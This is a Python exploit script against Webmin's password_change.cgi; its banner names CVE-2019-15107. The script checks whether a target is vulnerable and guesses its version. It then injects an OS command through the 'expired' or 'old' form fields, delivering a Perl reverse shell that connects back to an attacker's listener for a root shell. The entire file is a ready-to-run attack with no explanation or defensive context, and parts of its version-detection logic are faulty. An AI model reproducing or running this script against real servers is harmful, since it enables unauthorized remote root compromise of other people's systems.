import re
import sys
import requests
import argparse
import urllib.parse

banner = """
  ___  _  _  ____     ___   ___  __  ___      __  ___  __  ___  ___
 / __)( \/ )( ___)___(__ \ / _ \/  )/ _ \ ___/  )| __)/  )/ _ \(__ )
( (__  \  /  )__)(___)/ _/( (_) ))( \_  /(___))( |__ \ )(( (_) )/ /
 \___)  \/  (____)   (____)\___/(__) (_/     (__)(___/(__)\___/(_/

 +-+-+ +-+-+-+-+-+
|B|y| |v|r|v|i|k|
+-+-+ +-+-+-+-+-+
 """

def check_password_change(base_url):
	url = base_url + '/password_change.cgi'
	headers = {
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%base_url,
    }
	post_req = requests.get(url, headers=headers, verify=False)
	return post_req

def version(base_url):
	url = base_url + '/password_change.cgi'
	headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%base_url,
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    } 
	if re.search(".*password_change.cgi*", requests.post(url, headers=headers, data="user=root&pam=&expired=2&old=AkkuS%7cdir%20&new1=akkuss&new2=akkuss", verify=False).content.decode('utf-8')):
		ver = '>1.890'
	if re.search(".*uid=0*", requests.post(url, headers=headers, data="expired=id", verify=False).content.decode('utf-8')):
		ver = '1.890'
	else:
		print('Application is not Vulnerable')
		sys.exit()
	return ver

def exploit(base_url, command, ver):
	url = base_url + '/password_change.cgi'
	headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%base_url,
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    }
	if(ver == '1.890'):
		print("Webmin version 1.890 detected")
		payload = "expired=%s"%urllib.parse.quote_plus(command)
	elif(ver == '>1.890'):
		print("Webmin version > 1.890 detected")
		payload = "user=root&pam=&expired=2&old=AkkuS%7c" + urllib.parse.urlencode(command) + "%20&new1=akkuss&new2=akkuss"
	print('Trying to pop a root shell on your netcat listener')
	post_req = requests.post(url, headers=headers, data=payload, verify=False)
	print('Thanks for using this script')

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', action='store', type=str, required=True, help='Target URL, example: http://10.10.10.10:10000')
	parser.add_argument('-lhost', action='store', type=str, required=True, help='Local Host to connect to')
	parser.add_argument('-lport', action='store', type=int, required=True, help='Local Port to connect to')
	args = parser.parse_args()
	print(banner)
	shell_payload = "perl -e 'use Socket;$i=\"" + args.lhost + "\";$p=" + str(args.lport) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	check_result = check_password_change(args.t)
	if check_result.status_code == 200 and re.search(".*Failed*", check_result.content.decode('utf-8')):
		ver = version(args.t)
		exploit(args.t, shell_payload, ver)
	else:
		print("Not Exploitable")
